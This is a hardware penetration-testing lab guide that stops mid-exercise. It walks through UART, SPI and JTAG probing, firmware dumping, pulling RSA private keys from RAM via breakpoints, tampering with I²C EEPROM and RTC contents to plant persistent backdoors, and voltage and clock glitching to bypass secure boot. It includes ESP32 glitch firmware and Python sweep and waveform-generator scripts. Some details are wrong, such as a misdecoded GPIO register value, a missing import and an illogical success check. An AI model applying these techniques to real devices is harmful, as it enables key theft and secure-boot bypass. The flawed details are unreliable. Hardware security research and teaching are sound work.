# Operational Verification Labs: Offensive Security

## Objective & Lab Bench Setup

This laboratory guide equips the penetration tester and hardware security researcher with concrete methodologies for probing embedded systems, extracting firmware images, identifying attack surfaces through signal analysis, and validating exploits against physical targets. Unlike software-only security assessments conducted through network interfaces or application layers, hardware offensive security demands direct electrical access to target devices, requiring familiarity with digital communication protocols at the physical and data-link layers, proficiency with bus analyzers and debuggers operating below the operating system boundary, and the ability to correlate transient electrical signals with security-relevant state transitions in silicon.

The modern embedded attack surface spans multiple interconnected layers. At the lowest stratum lies the silicon itself—flash memory chips storing bootloader code and cryptographic material, microcontroller peripherals exposing debug interfaces through test access ports, and voltage regulators whose transient behavior leaks information about computational state. Above this physical foundation, serial buses carry plaintext command streams between components: SPI transfers ferrying firmware blocks from external flash to processor cache, I²C transactions authenticating peripheral modules, and UART consoles emitting diagnostic telemetry never intended for adversarial observation. These communication channels, designed for manufacturing test and field service, persist in production hardware as architectural vestiges—forgotten debug ports, unauthenticated bootloader shells, and memory-mapped registers that bypass higher-level access controls.

Your laboratory workbench must bridge the gap between digital abstraction and analog reality. Begin with a grounded ESD-safe work surface, as modern CMOS circuits fail permanently under electrostatic discharge events exceeding device-specific latch-up thresholds. Mount a stereo microscope with 10×–40× magnification range and adjustable ring illumination—precise probe placement on 0.5mm pitch BGA pads and identification of silk-screened test points requires optical magnification that handheld loupes cannot provide. Acquire a USB logic analyzer supporting at least eight channels with 24MHz minimum sample rate; the Saleae Logic series and sigrok-compatible fx2lafw devices provide sufficient bandwidth for SPI, I²C, and UART protocol decode. Supplement the logic analyzer with a two-channel oscilloscope offering 100MHz bandwidth and 1GSa/s sampling—transient glitch injection and power analysis demand analog fidelity that purely digital capture tools cannot deliver.

For interfacing with target systems, stock your bench with a collection of physical adapters translating between USB host interfaces and embedded debug protocols. A versatile UART bridge such as the FTDI FT232H or Silicon Labs CP2102 provides 3.3V and 5V TTL serial connectivity; ensure your adapter exposes both TX/RX data lines and hardware flow control signals RTS/CTS, as some bootloader unlock sequences require precise timing of control assertions. For JTAG and SWD debugging, the SEGGER J-Link EDU or Black Magic Probe delivers industrial-grade boundary-scan and CoreSight access to ARM Cortex targets. SPI and I²C bus manipulation requires either a dedicated protocol analyzer like the Total Phase Beagle series or a multipurpose tool such as the Bus Pirate or GreatFET, both of which combine capture and transmission capabilities in a single USB peripheral.

Install the sigrok suite as your primary signal analysis framework. The `sigrok-cli` command-line interface provides protocol decoders for dozens of serial standards, enabling automated dissection of captured waveforms into human-readable transaction logs. The `libsigrok` backend supports hardware from multiple vendors through a unified driver API, eliminating tool-specific capture workflows. Compile and install PulseView as the graphical companion to sigrok-cli when visual correlation between analog and digital signals becomes necessary. For firmware extraction and manipulation, deploy `flashrom`, the universal SPI flash programmer supporting hundreds of chip models through libftdi and linux-spidev backends. Install `binwalk` for automated firmware image analysis, `radare2` for disassembly and reverse engineering, and `gdb-multiarch` for remote debugging sessions against non-x86 targets.

OpenOCD (Open On-Chip Debugger) serves as the universal adapter between high-level debuggers like GDB and low-level JTAG/SWD hardware interfaces. Install the latest upstream OpenOCD release, verifying support for your specific debug probe and target architecture. OpenOCD configuration proceeds through Tcl script files specifying interface adapter electrical characteristics and target CPU debug architecture. For ARM Cortex-M devices, the scripts instantiate a Debug Access Port (DAP) implementing the ARM Debug Interface Architecture, exposing memory-mapped access to core registers, system bus transactions, and Flash Patch Breakpoint (FPB) units. OpenOCD's GDB remote serial protocol server then translates debugger commands like memory reads and breakpoint insertion into DAP transactions transmitted over the physical JTAG or SWD link.

Prepare a target device collection spanning representative embedded architectures and security postures. Low-cost development boards such as the STM32 Nucleo series, ESP32 modules, and Raspberry Pi Pico provide known-good reference platforms with published schematics and unlocked debug interfaces—ideal for technique validation before confronting hardened production targets. Acquire several consumer IoT devices representing real-world attack surfaces: IP cameras, smart home controllers, and wireless routers. These devices typically employ cost-optimized designs omitting expensive security features, shipping with accessible UART consoles, unpopulated JTAG headers, and flash memory chips in standard SOIC or WSON packages amenable to clip-based access.

Physical access to internal circuitry requires disassembly tools appropriate for modern consumer electronics enclosures. Plastic spudgers and nylon pry tools separate snap-fit housings without marring surfaces or leaving forensic tool marks. Precision screwdriver sets covering Torx, hex, and tri-wing security fasteners defeat tamper-resistant closures. For soldering fine-pitch connections, equip your bench with a temperature-controlled station delivering 350°C tip temperature, 0.5mm conical or chisel tips, and no-clean flux core solder in 0.5mm diameter. Solder wick and desoldering braid remove existing connections when probing requires component replacement or in-circuit programming clip attachment.

Wire your bench with stable, isolated power supplies providing adjustable voltage rails from 1.8V to 12V at several amperes—many embedded targets operate at 3.3V logic levels but require separate rails for core and I/O domains. Incorporate current-limited supplies with 10mA resolution to observe power consumption signatures during cryptographic operations and fault injection experiments. Ground all instruments to a common earth reference through a star topology, minimizing ground loops that inject noise into sensitive analog measurements. Route high-frequency digital signals like SPI clock and JTAG TCK through short, twisted-pair connections, and terminate unused logic analyzer channels with 50Ω to reduce capacitive loading and crosstalk.

Document every probe point, pinout, and configuration through photography and structured notes. Maintain a laboratory notebook recording target identification, PCB revision marks, component part numbers extracted from package markings, and observed behavior under various stimuli. This forensic discipline proves invaluable when correlating firmware analysis with hardware observations—a particular memory address range flagged by `binwalk` as a compressed filesystem corresponds to SPI transactions captured during boot, confirming the physical chip storing that data. Your notes become the ground truth when datasheets conflict with observed behavior, as manufacturers frequently revise silicon without updating public documentation.

## Exercise 1: Live Hardware Probing & Signal Capture

This first exercise develops your proficiency in electrical reconnaissance—the art of identifying unknown signals on a printed circuit board, capturing their temporal behavior through logic analysis, and reconstructing the digital protocol semantics from raw voltage transitions. You will probe a live embedded system, correlate silk-screen markings and component datasheets with observed waveforms, and extract meaningful intelligence about system architecture and communication flows without disassembling the target or extracting firmware images. This non-invasive reconnaissance phase precedes all subsequent offensive operations, establishing the electrical ground truth upon which firmware extraction and exploit delivery depend.

Select a target device exposing a conventional embedded architecture: a wireless router, IP camera, or consumer IoT appliance. Power the device through an external bench supply rather than its included adapter, enabling current monitoring and controlled fault injection in later exercises. Before making any electrical contact, photograph all PCB surfaces at sufficient resolution to read component markings and trace routing. Identify the main processor by locating the largest BGA or QFP package, typically positioned centrally with substantial power delivery circuitry nearby—multiple decoupling capacitors, inductor-based buck converters, and wide copper pours indicating high-current paths. Read the processor part number from the package top marking; cross-reference this identifier against manufacturer datasheets to determine architecture (ARM Cortex-M, MIPS, RISC-V), clock frequency, and integrated peripherals.

Locate the primary non-volatile storage. Modern embedded designs employ either internal flash integrated within the processor package or external serial flash interfaced through SPI. External flash appears as an 8-pin SOIC or WSON package positioned near the processor, connected via four signal traces: MISO (Master In Slave Out), MOSI (Master Out Slave In), SCK (Serial Clock), and CS (Chip Select). Read the flash chip's part number and consult datasheets to confirm SPI protocol support, storage capacity, and sector geometry. Note the presence of any write-protect pins—certain designs ground WP (Write Protect) through zero-ohm resistors, allowing simple hardware bypasses of software-based flash locking mechanisms.

Search for UART test points, the most commonly accessible debug interface in embedded systems. Manufacturers include UART consoles for manufacturing test and field service, often leaving these interfaces active in production firmware. UART requires only three conductors: TX (transmit from device), RX (receive to device), and GND (ground reference). On PCBs, these connections frequently appear as unpopulated header footprints near board edges, labeled with silk-screen identifiers like "J1", "DEBUG", or "CONSOLE". Alternatively, probe pads may be exposed vias with no through-hole plating—these require direct wire soldering or spring-loaded pogo-pin contact. Measure continuity between suspected ground pads and the board's metal shielding or power connector ground to confirm the GND reference.

Connect your USB logic analyzer to the target UART interface. Attach the logic analyzer's ground clip to the target PCB ground reference—use a chassis screw, metal shielding can, or verified ground pad. Connect logic analyzer channel 0 to the suspected TX pad and channel 1 to RX. Launch `sigrok-cli` with protocol decoder configuration to capture and parse UART frames:

```bash
sigrok-cli --driver fx2lafw --samples 10M --channels 0,1 \
  --protocol-decoders uart:baudrate=115200:parity=none:data_bits=8:stop_bits=1 \
  --protocol-decoder-annotations uart=tx-data,rx-data
```

This invocation configures the fx2lafw-compatible logic analyzer to capture 10 million samples across channels 0 and 1, applying a UART decoder with standard 115200 baud 8N1 framing. Power on the target device while the capture runs. If the baud rate assumption is incorrect, you will observe framing errors and garbled text in the decoder output. UART baud rates follow standard values: 9600, 19200, 38400, 57600, 115200, 230400, 460800, and 921600. Repeat the capture at each baud rate until coherent ASCII text emerges—bootloader banners, Linux kernel messages, or shell prompts confirm successful synchronization.

A correctly captured UART session during device boot reveals substantial intelligence. Early bootloader messages disclose ROM code versions, processor stepping identifiers, and memory initialization sequences. Kernel boot logs enumerate loaded device drivers, mounted filesystems, and network interface configurations. Login prompts indicate authentication requirements—many embedded systems ship with default credentials like "root:root" or "admin:admin" documented in service manuals but never changed by end users. Even when credentials are unknown, the presence of an interactive shell confirms the UART interface as a viable attack surface for exploit delivery.

If UART reconnaissance yields no results despite probing multiple pad combinations, escalate to exhaustive pad enumeration. Use the logic analyzer in continuous capture mode to monitor all suspected signal pads simultaneously while power-cycling the target. Most embedded systems emit diagnostic output during the first seconds after reset when security mechanisms have not yet initialized. Set `sigrok-cli` to trigger on any edge transition, capturing all transient activity:

```bash
sigrok-cli --driver fx2lafw --continuous --channels 0-7 \
  --triggers 0=r,1=r,2=r,3=r,4=r,5=r,6=r,7=r \
  --output-format ascii
```

This command monitors eight channels, triggering capture whenever any channel experiences a rising edge. Review the resulting waveforms through PulseView's graphical interface, examining signal periodicity and data framing. UART transmissions exhibit characteristic start-bit low pulses followed by data bit periods and stop-bit high levels. SPI appears as synchronous clock and data lines with chip-select framing. I²C shows alternating clock and data transitions with distinct start and stop conditions.

Once UART access is confirmed, establish persistent serial connectivity through a dedicated USB-UART adapter. Solder 30AWG wire-wrap wire to the verified TX, RX, and GND pads—spring-loaded clips and probe hooks introduce intermittent connections that disrupt interactive shells. Connect the target TX to adapter RX, target RX to adapter TX, and common GND. Launch a terminal emulator configured for the determined baud rate:

```bash
minicom -D /dev/ttyUSB0 -b 115200
```

Minicom provides a VT100-compatible terminal with hardware flow control disabled by default—critical for embedded UART consoles that rarely implement RTS/CTS signaling. Power-cycle the target and observe the complete boot sequence. Interrupt the bootloader countdown by transmitting a specific keystroke—commonly `Ctrl-C`, space bar, or `Esc`—halting automatic boot and dropping into a bootloader shell. U-Boot, the predominant embedded bootloader, responds to interruption with a `=>` prompt accepting commands for memory inspection, flash programming, and network boot.

Document the complete boot log, identifying security-relevant details: kernel command-line parameters that disable ASLR or root filesystem integrity checks, loaded kernel modules that expose device drivers, mounted filesystems revealing partition layouts, and spawned network services listening on exploitable ports. Cross-reference process listings against CVE databases—older embedded devices frequently run outdated software with published vulnerabilities. The UART console has transformed from an electrical curiosity into a surgical strike point: a local, high-privilege interface bypassing network authentication and application-layer defenses.

Extend your reconnaissance to SPI bus signals carrying firmware transactions between the processor and external flash. Identify the four SPI connections on the target PCB by tracing copper from the flash chip's pins to processor pads or exposed vias. Connect logic analyzer channels to CS, SCK, MOSI, and MISO, ensuring the ground reference remains common. Configure `sigrok-cli` with the SPI protocol decoder:

```bash
sigrok-cli --driver fx2lafw --samples 50M --channels CS=0,SCK=1,MOSI=2,MISO=3 \
  --protocol-decoders spi:cs_polarity=active-low:wordsize=8 \
  --protocol-decoder-annotations spi=miso-data,mosi-data
```

Power-cycle the target while capturing. The boot process generates intensive SPI activity as the bootloader reads firmware from flash into RAM. The decoded output reveals raw byte streams—often compressed kernel images, root filesystem archives, or bootloader configuration blocks. Observe the SPI transaction structure: each read command begins with a chip-select assertion (CS pulled low), followed by an opcode byte (0x03 for standard read, 0x0B for fast read), three address bytes specifying the flash location, and a stream of data bytes clocked out on MISO. The address sequence increments sequentially during linear reads, confirming the spatial layout of firmware in flash memory.

Compare captured SPI addresses against known boot behavior. If the bootloader prints "Loading kernel from 0x40000..." on the UART console while SPI transactions simultaneously read from address 0x40000, you have correlated logical firmware structure with physical storage locations. This correlation enables precise targeting of subsequent extraction and modification operations—you now know which flash sectors contain the kernel, which hold the root filesystem, and which store bootloader environment variables controlling device behavior.

For devices employing JTAG debug interfaces, probe the standard five-signal JTAG chain: TCK (Test Clock), TMS (Test Mode Select), TDI (Test Data In), TDO (Test Data Out), and TRST (Test Reset, optional). JTAG connections often appear as 10-pin or 20-pin headers conforming to ARM's CoreSight or IEEE 1149.1 standard pinouts. If no header is populated, search for exposed vias near the processor package—manufacturers frequently route JTAG signals to test points for factory programming. Verify pin functionality using a multimeter in continuity mode, checking that suspected TRST and SRST (System Reset) lines connect to the processor reset pin.

Connect your JTAG adapter—a Black Magic Probe, J-Link, or OpenOCD-compatible device—to the target JTAG header. Launch OpenOCD with a configuration script specifying both interface adapter and target CPU:

```bash
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg
```

OpenOCD attempts to enumerate the JTAG chain by shifting identification patterns through TDI/TDO and sampling the results. Successful enumeration prints the detected CPU's IDCODE, a 32-bit value uniquely identifying the device manufacturer and part number. If enumeration fails, the target may employ SWD (Serial Wire Debug), a two-wire alternative to JTAG used on space-constrained ARM Cortex-M devices. Reconfigure OpenOCD for SWD transport:

```tcl
# interface/jlink-swd.cfg
source [find interface/jlink.cfg]
transport select swd
```

```bash
openocd -f interface/jlink-swd.cfg -f target/stm32f4x.cfg
```

A working debug connection grants OpenOCD full control over the target processor: halting execution, inspecting memory and registers, and setting breakpoints. Validate this access by halting the CPU and reading the program counter:

```bash
telnet localhost 4444
> halt
target halted due to debug-request, current mode: Thread
> reg pc
pc (/32): 0x08001234
```

The program counter value 0x08001234 indicates code execution from internal flash at offset 0x1234—ARM Cortex-M processors map flash to address 0x08000000 by default. Dump several kilobytes of flash memory to verify the debug connection's fidelity:

```bash
> dump_image flash_sample.bin 0x08000000 0x10000
dumped 65536 bytes in 2.341s (27.349 KiB/s)
```

Examine `flash_sample.bin` with `hexdump` and `binwalk`, confirming it contains valid ARM Thumb-2 instruction encodings and recognizable data structures. This non-destructive memory snapshot, captured through the debug interface without physically removing the flash chip, demonstrates the power of live hardware probing—you have extracted executable code from a running system using only electrical access, bypassing all software-based protections.

## Exercise 2: Bus Sniffing, Register Inspection & Memory Dumping

Building upon the reconnaissance methodologies of Exercise 1, this second laboratory session executes complete firmware extraction workflows targeting external SPI flash chips, inspects processor register state through JTAG/SWD to identify cryptographic material and authentication credentials, and reconstructs memory-mapped peripheral configurations revealing hardware attack surfaces unavailable to software-only analysis. You will physically manipulate target hardware, removing flash chips for offline reading, injecting malicious commands into I²C buses, and correlating register dumps with observed system behavior to map security-critical state.

Begin with direct SPI flash extraction using a dedicated programmer bypassing the main processor entirely. When JTAG access is restricted or bootloader protections prevent memory dumping, direct flash reading provides an alternative path to firmware acquisition. Locate the target device's SPI flash chip—typically an 8-pin SOIC package labeled with manufacturers like Winbond (W25Q series), Macronix (MX25L series), or GigaDevice (GD25Q series). Record the complete part number from the chip's top marking; for example, "W25Q128JVSIQ" denotes a Winbond 128-megabit (16-megabyte) serial flash with a specific package and temperature grade.

Power down the target device and discharge all capacitors by shorting power rails to ground through a 10Ω resistor. Affix a SOIC-8 test clip to the flash chip—these spring-loaded clips grasp the IC's body with eight individual contacts aligning to pin positions. Pomona 5250 or equivalent clips fit standard 208-mil wide SOIC packages without requiring desoldering. Connect the test clip's signals to your SPI programmer following the flash chip's datasheet pinout: pin 1 is CS, pin 2 is MISO (DO), pin 5 is MOSI (DI), pin 6 is SCK (CLK), and pins 4/8 provide GND and VCC respectively. Hold and Write-Protect pins (3 and 7) should be pulled high to VCC through 4.7kΩ resistors, disabling hardware-level write protection.

An FTDI FT2232H-based programmer provides a versatile SPI interface compatible with `flashrom`. Connect the FT2232H to your workstation via USB and verify device enumeration:

```bash
lsusb | grep 0403:6014
Bus 001 Device 005: ID 0403:6014 Future Technology Devices International, Ltd FT232H Single HS USB-UART/FIFO IC
```

The FT2232H appears as a Future Technology Devices International product. Modern Linux kernels load the `ftdi_sio` driver automatically, but `flashrom` requires direct libftdi access rather than serial port emulation. Unbind the kernel driver:

```bash
echo "1-1.2:1.0" > /sys/bus/usb/drivers/ftdi_sio/unbind
```

Replace "1-1.2:1.0" with the device's bus topology string obtained from `lsusb -t`. Launch `flashrom` to detect the connected flash chip:

```bash
flashrom -p ft2232_spi:type=232H,port=A
```

`flashrom` queries the chip's JEDEC ID by transmitting the 0x9F command over SPI and interpreting the response bytes. A successful detection prints the chip's manufacturer, model, and capacity:

```
Found Winbond flash chip "W25Q128.V" (16384 kB, SPI) on ft2232_spi.
```

Read the entire flash contents to a binary file:

```bash
flashrom -p ft2232_spi:type=232H,port=A --read firmware_dump.bin
```

This operation requires several minutes for a 16MB chip at typical SPI frequencies around 10MHz. `flashrom` reads the chip in 4KB page increments, verifying each page through readback before advancing. The resulting `firmware_dump.bin` file contains a byte-exact image of the flash chip's contents—bootloader, kernel, root filesystem, and any configuration data stored in dedicated partitions.

Analyze the firmware image with `binwalk` to identify embedded filesystems and compressed archives:

```bash
binwalk -e firmware_dump.bin
```

`binwalk` scans the image for magic bytes indicating file boundaries: U-Boot header signatures, Linux kernel compressed formats (gzip, LZMA, LZ4), and filesystem superblocks (SquashFS, JFFS2, UBIFS). The `-e` flag automatically extracts recognized structures into subdirectories. A typical embedded firmware image yields:

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             U-Boot legacy image, header size: 64 bytes, header CRC: 0x7A2B3C4D
64            0x40            Linux kernel ARM boot executable zImage (little-endian)
2097152       0x200000        Squashfs filesystem, little endian, version 4.0
```

Navigate into the extracted SquashFS directory and examine the root filesystem structure. Configuration files in `/etc/` reveal network settings, authentication databases, and service startup scripts. The `/etc/shadow` file may contain weakly hashed passwords—many embedded devices use DES-based crypt hashes trivially broken by modern GPU crackers. Search for hardcoded credentials in shell scripts and configuration files:

```bash
grep -r "password\|passwd\|pwd" etc/
```

Private keys for SSH or TLS often reside in `/etc/dropbear/` or `/etc/ssl/private/`, enabling man-in-the-middle attacks or unauthorized access to other devices trusting these credentials. Proprietary binaries in `/bin/`, `/sbin/`, and `/usr/bin/` warrant reverse engineering with `radare2` to discover undocumented protocols and authentication bypasses.

When direct flash reading is impractical—perhaps the chip is BGA-packaged or the PCB lacks accessible SPI traces—leverage JTAG memory dumping instead. Return to the OpenOCD session established in Exercise 1 and enumerate the target's memory map. ARM Cortex-M devices present a standard memory layout: internal flash at 0x08000000, SRAM at 0x20000000, and peripheral registers at 0x40000000. Dump the internal flash:

```bash
> dump_image internal_flash.bin 0x08000000 0x100000
```

For devices with external DRAM, the memory controller must be initialized before dumping, as DRAM contents are lost at power-down. Some OpenOCD target configurations include initialization scripts that configure clocks and DRAM controllers; invoke these before attempting DRAM dumps:

```bash
> reset init
> dump_image dram_dump.bin 0xC0000000 0x8000000
```

Processor register inspection reveals runtime secrets inaccessible through static firmware analysis. After halting the CPU, dump all general-purpose and special-function registers:

```bash
> halt
> reg
===== arm v7m registers
(0) r0 (/32): 0x20001234
(1) r1 (/32): 0x00000000
(2) r2 (/32): 0x40020000
...
(13) sp (/32): 0x20007FF0
(14) lr (/32): 0x08001ABC
(15) pc (/32): 0x08001234
(16) xPSR (/32): 0x61000000
===== Cortex-M DWT registers
(17) dwt_ctrl (/32): 0x40000000
...
```

The stack pointer (sp) points to 0x20007FF0, placing the current stack frame near the top of SRAM. Dump the stack region to capture local variables, return addresses, and any sensitive data temporarily held in memory:

```bash
> dump_image stack_dump.bin 0x20007000 0x1000
```

Analyze `stack_dump.bin` with `strings` and hex editors, searching for plaintext credentials, cryptographic keys, or session tokens. Embedded applications frequently store sensitive material in stack-allocated buffers without explicit zeroing—a debug session capturing stack state during authentication may harvest passwords entered by users.

For cryptographic key extraction, set breakpoints on functions implementing encryption or signature operations. If the firmware uses a standard library like mbedTLS or OpenSSL, identify the library's function symbols through pattern matching or cross-referencing with open-source builds. Set a breakpoint at the entry of `mbedtls_rsa_private()` to capture RSA private key material loaded into registers before signing:

```bash
> bp 0x08003210 4 hw
Breakpoint 1 at 0x08003210: file rsa.c, line 234.
> resume
> # Trigger signing operation on the target device
> halt
Info : halted: PC: 0x08003210
> reg r0 r1 r2
r0 (/32): 0x20002000
r1 (/32): 0x00000100
r2 (/32): 0x20003000
```

Register r0 holds a pointer to the RSA context structure; r1 specifies the input data length; r2 points to the output buffer. Dump the memory regions referenced by r0 and r2 to extract the private key and signature:

```bash
> dump_image rsa_context.bin 0x20002000 0x400
> dump_image signature.bin 0x20003000 0x100
```

Parse `rsa_context.bin` according to the mbedTLS `mbedtls_rsa_context` structure layout documented in the library's source code. The private exponent `D`, primes `P` and `Q`, and modulus `N` appear as multi-precision integer arrays—reverse these byte sequences and import into a cryptographic toolkit for offline signing or decryption operations.

Peripheral register inspection uncovers hardware-level attack surfaces. ARM Cortex-M peripherals occupy the 0x40000000–0x5FFFFFFF address range, with each peripheral allocated a 1KB register block. Common peripherals include GPIO (General Purpose Input/Output), UART, SPI, I²C, Timers, and DMA controllers. Read the GPIO configuration registers to determine which pins control security-relevant hardware: LEDs indicating tamper state, relay drivers switching high-voltage loads, or chip-select lines enabling external components.

For an STM32F4 target, GPIO Port A's configuration resides at 0x40020000. Dump the mode register (MODER), output type register (OTYPER), and alternate function registers:

```bash
> mdw 0x40020000 16
0x40020000: 0xA8000000 0x00000000 0x64000000 0x00000000
0x40020010: 0x00000000 0x00000000 0x00000000 0x00000000
```

Each 2-bit field in MODER configures a pin's direction: 00 = input, 01 = output, 10 = alternate function, 11 = analog. The value 0xA8000000 decodes to pins PA0–PA3 in input mode, PA4–PA5 in output mode, and remaining pins in alternate function. Cross-reference these configurations against the device schematic to correlate pins with external hardware—PA5 might drive an enable signal for a power amplifier, presenting an opportunity for denial-of-service attacks through GPIO manipulation.

I²C bus injection demonstrates active probing beyond passive sniffing. Many embedded systems use I²C to communicate with peripheral sensors, EEPROMs storing calibration data, or power management ICs controlling voltage rails. An adversary with I²C access can impersonate legitimate devices, injecting false sensor readings or modifying stored parameters. Connect a Bus Pirate or similar I²C master to the target's SDA and SCL lines, ensuring a common ground reference.

Scan the I²C bus to enumerate responding slave addresses:

```bash
i2cdetect -y 1
```

`i2cdetect` probes all 127 possible 7-bit I²C addresses, printing a table showing which addresses acknowledge. A typical result:

```
     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f
00:          -- -- -- -- -- -- -- -- -- -- -- -- --
10: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
20: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
30: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
40: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
50: 50 -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
60: -- -- -- -- -- -- -- -- 68 -- -- -- -- -- -- --
70: -- -- -- -- -- -- -- --
```

Address 0x50 corresponds to a standard I²C EEPROM; address 0x68 is a real-time clock (RTC) IC. Read the EEPROM's contents using `i2cget` or `i2cdump`:

```bash
i2cdump -y 1 0x50
```

This command dumps all readable registers from the device at address 0x50, revealing stored configuration data, MAC addresses, or cryptographic material. Modify EEPROM contents with `i2cset`:

```bash
i2cset -y 1 0x50 0x00 0xFF
```

This writes the value 0xFF to register 0x00 at device 0x50. Persistent configuration stored in EEPROM can survive firmware reflashing, enabling adversaries to inject backdoor parameters that persist across software updates.

For RTC manipulation, consider that many embedded security systems rely on the hardware clock for timestamping audit logs or validating time-limited certificates. Read the current RTC value:

```bash
i2cget -y 1 0x68 0x00
```

The RTC's seconds register at offset 0x00 returns a BCD-encoded value. Write arbitrary time values to the RTC, causing the system to believe it is operating in a different time window—potentially enabling replay attacks against time-limited authentication tokens or bypassing certificate expiration checks.

Conclude this exercise by documenting the complete memory map, peripheral configurations, and extracted artifacts. Create a structured report correlating physical register addresses with their security implications: which GPIO pins control tamper sensors, which UART interfaces accept unauthenticated commands, and which I²C devices hold modifiable configuration data. This intelligence forms the foundation for exploit development in Exercise 3, where you will weaponize these hardware access points against the target system.

## Exercise 3: Fault Simulation & Exploit Verification

This final exercise synthesizes reconnaissance and extraction methodologies into offensive exploit delivery, validating theoretical attack vectors through electrical manipulation of target hardware. You will induce voltage glitches that bypass secure boot authentication, corrupt cryptographic computations through clock manipulation, and verify privilege escalation exploits by observing register state transitions under debugger control. These practical demonstrations bridge the conceptual gap between vulnerability disclosure and weaponized exploit, proving feasibility through hardware-level verification rather than software simulation.

Voltage fault injection exploits the target processor's sensitivity to power supply transients. Modern CMOS logic requires stable supply voltage within a narrow window—typically 3.3V ±5%—for correct operation. Brief undervoltage events, lasting microseconds to milliseconds, corrupt instruction execution, memory transactions, or register updates without triggering brown-out reset circuits designed to halt the CPU only during sustained power loss. These transient faults manifest as bit flips in computational results, skipped instructions, or erroneous conditional branch outcomes—all potentially useful for subverting security checks.

Construct a voltage glitching apparatus using a power MOSFET switching the target's supply rail. A logic-level N-channel MOSFET such as the IRLZ44N serves as a programmable shunt between VCC and ground, controlled by a microcontroller GPIO pin. Wire the MOSFET drain to the target device's 3.3V supply rail, source to ground, and gate to an ESP32 or Arduino GPIO. The microcontroller firmware generates precisely timed gate pulses, temporarily pulling VCC low during security-critical operations.

Identify the target operation to glitch through preliminary analysis. Secure boot systems verify cryptographic signatures over firmware images before transferring execution—a process requiring milliseconds of computation. Interrupt this verification by glitching the power supply during signature comparison. Connect the logic analyzer to monitor the target UART for boot messages while the glitching apparatus operates. The ESP32 firmware implements a parameterized glitch generator:

```c
#define GLITCH_PIN 23
#define TRIGGER_PIN 22
#define GLITCH_WIDTH_US 50
#define GLITCH_DELAY_MS 100

void setup() {
  pinMode(GLITCH_PIN, OUTPUT);
  pinMode(TRIGGER_PIN, INPUT);
  digitalWrite(GLITCH_PIN, LOW);
}

void loop() {
  if (digitalRead(TRIGGER_PIN) == HIGH) {
    delayMicroseconds(GLITCH_DELAY_MS * 1000);
    digitalWrite(GLITCH_PIN, HIGH);
    delayMicroseconds(GLITCH_WIDTH_US);
    digitalWrite(GLITCH_PIN, LOW);
    delay(1000);
  }
}
```

Connect the TRIGGER_PIN to a physical button or automate triggering through serial command. Power on the target device while the glitch circuit is armed. As the bootloader begins signature verification, the ESP32 asserts the MOSFET gate, pulling VCC low for 50 microseconds. Monitor the UART console for anomalous behavior—successful glitches may print error messages, skip authentication, or proceed directly to shell prompts without credential prompts.

Optimize glitch parameters through systematic exploration of the timing and duration space. The `GLITCH_DELAY_MS` parameter controls when the glitch occurs relative to trigger assertion; `GLITCH_WIDTH_US` specifies the glitch duration. Automate parameter sweeps by scripting the ESP32 to iterate through delay/width combinations while monitoring the UART output for success indicators:

```python
import serial
import time

ser = serial.Serial('/dev/ttyUSB0', 115200)
glitch_control = serial.Serial('/dev/ttyUSB1', 115200)

for delay in range(50, 500, 10):
    for width in range(10, 200, 10):
        glitch_control.write(f"SET_DELAY {delay}\n".encode())
        glitch_control.write(f"SET_WIDTH {width}\n".encode())
        glitch_control.write(b"ARM\n")
        
        # Power cycle target
        time.sleep(0.5)
        uart_output = ser.read(ser.in_waiting)
        
        if b"Shell>" in uart_output or b"Authenticated" not in uart_output:
            print(f"Success at delay={delay}ms, width={width}us")
            break
```

This Python script systematically probes the parameter space, logging successful combinations. Voltage glitching exhibits probabilistic behavior—a particular parameter set may succeed in 10% of attempts due to process variation and environmental noise. Repeat successful parameters multiple times to characterize reliability.

Clock glitching offers an alternative fault injection mechanism targeting synchronous digital logic. Most embedded processors accept an external crystal or oscillator providing the master clock signal. By injecting additional clock edges or omitting expected edges, you corrupt instruction fetch timing, register updates, or memory controller transactions. Unlike voltage glitching, clock glitching requires direct electrical access to the processor's clock input pin—typically a crystal oscillator connected to dedicated OSC_IN/OSC_OUT pads.

For this demonstration, target a device using an external crystal rather than an integrated oscillator, simplifying clock injection. Desolder one leg of the crystal from the PCB, breaking the oscillation loop. Connect a signal generator to the now-floating crystal pad, providing a substitute clock signal. Configure the generator to output a square wave matching the crystal's nominal frequency—typically 8MHz, 12MHz, or 16MHz for ARM Cortex-M devices—with 3.3V CMOS logic levels.

Launch OpenOCD and establish JTAG connectivity to the target. Set a breakpoint at the secure boot signature verification routine, identified through prior static analysis of the bootloader binary. Single-step through the verification code while observing register contents:

```bash
> bp 0x08000234 4 hw
> resume
Info : halted: PC: 0x08000234
> step
> reg r0 r1 r2
```

As the verification progresses through cryptographic operations, inject clock glitches by briefly doubling the generator's frequency. The Rigol DG1022Z and Siglent SDG series arbitrary waveform generators support scripted frequency modulation. Create a Python control script:

```python
import pyvisa

rm = pyvisa.ResourceManager()
awg = rm.open_resource('USB0::0xF4EC::0xEE38::SDG00001::INSTR')

awg.write('C1:BSWV WVTP,SQUARE,FRQ,8000000,AMP,3.3V,OFST,1.65V')
time.sleep(0.1)
# Inject glitch: double frequency for 10us
awg.write('C1:BSWV FRQ,16000000')
time.sleep(0.00001)
awg.write('C1:BSWV FRQ,8000000')
```

Execute this script while the target executes signature verification. Clock glitches may cause the processor to skip instructions, misread memory, or corrupt ALU results. Monitor the OpenOCD session for unexpected register values—a signature comparison that should fail (mismatched hash values) may incorrectly succeed if the comparison instruction is skipped or the result register is not updated.

Privilege escalation exploit verification requires correlating software-level exploitation with hardware-observable state changes. Consider a buffer overflow vulnerability in a network service running on the target embedded system. Craft an exploit payload that overwrites the return address on the stack, redirecting execution to attacker-controlled code. Deliver the exploit over the network while simultaneously monitoring processor state through JTAG.

Configure OpenOCD to trigger on specific memory address accesses using hardware watchpoints. Set a watchpoint on the stack region where the return address should be overwritten:

```bash
> wp 0x20007FFC 4 r
```

This watchpoint triggers when the processor reads from address 0x20007FFC—the location where the vulnerable function's return address is stored. Transmit the exploit payload to the target service and wait for the watchpoint to fire:

```bash
Info : halted: PC: 0x08002ABC
```

The processor halted at PC 0x08002ABC while attempting to read the return address. Inspect the stack contents:

```bash
> mdw 0x20007FF0 8
